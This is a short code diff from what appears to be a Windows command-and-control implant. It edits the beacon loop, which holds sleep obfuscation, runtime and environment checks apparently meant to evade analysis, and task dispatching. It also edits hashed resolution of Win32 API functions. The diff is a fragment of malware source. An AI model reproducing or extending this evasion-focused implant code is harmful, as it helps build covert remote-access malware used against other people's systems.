@@ -8,18 +8,14 @@ namespace Implant {
 
         do {
             Opsec::SleepObf();
-            if (!Opsec::RuntimeChecks()) {
-                return_defer(ntstatus);
-            }
+            x_assert(Opsec::RuntimeChecks());
 
             if (!Opsec::CheckTime()) {
                 continue;
             }
 
             if (!Ctx->session.checkin && !Ctx->transport.outbound_queue) {
-                if(!Opsec::CheckEnvironment()) {
-                    return_defer(ntstatus);
-                }
+                x_assert(Opsec::CheckEnvironment());
             }
 
             Dispatcher::DispatchRoutine();
@@ -30,9 +26,9 @@ namespace Implant {
                 if (Ctx->session.retry == 3) { break; }
                 continue;
             }
-
             Ctx->session.retry = 0;
-        } while (ntstatus != ERROR_EXIT);
+        }
+        while (ntstatus != ERROR_EXIT);
 
     defer:
         Memory::Context::ContextDestroy(Ctx);
@@ -249,7 +245,6 @@ namespace Implant {
         x_assertb(F_PTR_HMOD(Ctx->win32.InitializeAcl,                   Ctx->modules.advapi, INITIALIZEACL));
         x_assertb(F_PTR_HMOD(Ctx->win32.FreeSid,                         Ctx->modules.advapi, FREESID));
 
-        SetWrappers();
         Ctx->transport.outbound_queue = nullptr;
 
         Ctx->session.peer_id    = Parser::UnpackDword(&parser);
